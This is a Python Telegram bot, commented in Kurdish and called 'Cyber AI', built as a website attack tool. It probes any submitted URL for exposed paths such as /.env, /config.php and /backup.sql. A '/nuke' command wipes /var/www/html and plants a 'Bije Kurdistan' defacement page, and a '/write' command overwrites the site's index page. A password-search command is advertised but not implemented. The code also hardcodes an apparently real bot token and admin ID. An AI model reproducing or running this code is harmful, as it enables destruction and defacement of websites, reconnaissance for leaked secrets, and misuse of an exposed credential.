import requests
import os
import shutil
from telegram import Update
from telegram.ext import ApplicationBuilder, CommandHandler, MessageHandler, filters, ContextTypes

# زانیارییەکان
TOKEN = '8711589571:AAHn2FpUq5WnC0D7x-p9Fg3o9bfc2scEEOc'
ADMIN_ID = 7641255924  # ئایدییەکەی تۆ جێگیر کرا
WEBSITE_PATH = '/var/www/html/' # ناونیشانی فایلەکان لەسەر سێرڤەر

# فەرمانی دەستپێکردن
async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if update.effective_user.id != ADMIN_ID:
        return
    await update.message.reply_text("⚔️ بەخێرهاتی Cyber AI. بۆتەکە ئامادەیە.\n\n"
                                   "📜 فەرمانەکان:\n"
                                   "1. لینکی وێبسایت بنێرە بۆ پشکنین.\n"
                                   "2. /nuke - سڕینەوەی وێبسایت و دانانی دروشم.\n"
                                   "3. /write [دەق] - گۆڕینی ناوەڕۆکی وێبسایت.\n"
                                   "4. /find - گەڕان بەدوای پاسۆرد لەناو فایلەکان.")

# پشکنینی وێبسایت لە دوورەوە
async def scan_link(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if update.effective_user.id != ADMIN_ID: return
    url = update.message.text.strip()
    if not url.startswith('http'): url = 'http://' + url
    
    await update.message.reply_text(f"🔍 پشکنین بۆ {url} ...")
    paths = ['/admin', '/config.php', '/.env', '/backup.sql', '/phpmyadmin']
    found = [url + p for p in paths if requests.get(url + p, timeout=3).status_code == 200]
    
    if found:
        await update.message.reply_text("✅ دەرگای کراوە دۆزرایەوە:\n" + "\n".join(found))
    else:
        await update.message.reply_text("❌ هیچ دەرگایەکی ئاسان نەدۆزرایەوە.")

# سڕینەوەی وێبسایت (Nuke)
async def nuke(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if update.effective_user.id != ADMIN_ID: return
    try:
        if os.path.exists(WEBSITE_PATH):
            for item in os.listdir(WEBSITE_PATH):
                path = os.path.join(WEBSITE_PATH, item)
                if os.path.isfile(path): os.unlink(path)
                elif os.path.isdir(path): shutil.rmtree(path)
            
            with open(os.path.join(WEBSITE_PATH, 'index.html'), 'w') as f:
                f.write("<h1 style='text-align:center; margin-top:200px;'>Bije Kurdistan</h1>")
            await update.message.reply_text("🔥 وێبسایتەکە بەتەواوی سڕایەوە و پاککرایەوە.")
    except Exception as e:
        await update.message.reply_text(f"❌ هەڵە لە دەستڕەسی: {e}")

# نووسین لەناو وێبسایت
async def write(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if update.effective_user.id != ADMIN_ID: return
    text = ' '.join(context.args)
    if not text:
        await update.message.reply_text("⚠️ بنووسە: /write [دەق]")
        return
    try:
        with open(os.path.join(WEBSITE_PATH, 'index.html'), 'w') as f:
            f.write(f"<h1 style='text-align:center;'>{text}</h1>")
        await update.message.reply_text(f"✅ وێبسایتەکە گۆڕدرا بۆ: {text}")
    except Exception as e:
        await update.message.reply_text(f"❌ هەڵە: {e}")

if __name__ == '__main__':
    app = ApplicationBuilder().token(TOKEN).build()
    app.add_handler(CommandHandler("start", start))
    app.add_handler(CommandHandler("nuke", nuke))
    app.add_handler(CommandHandler("write", write))
    app.add_handler(MessageHandler(filters.TEXT & (~filters.COMMAND), scan_link))
    
    print("--- Cyber AI Bot is LIVE for ID 7641255924 ---")
    app.run_polling()
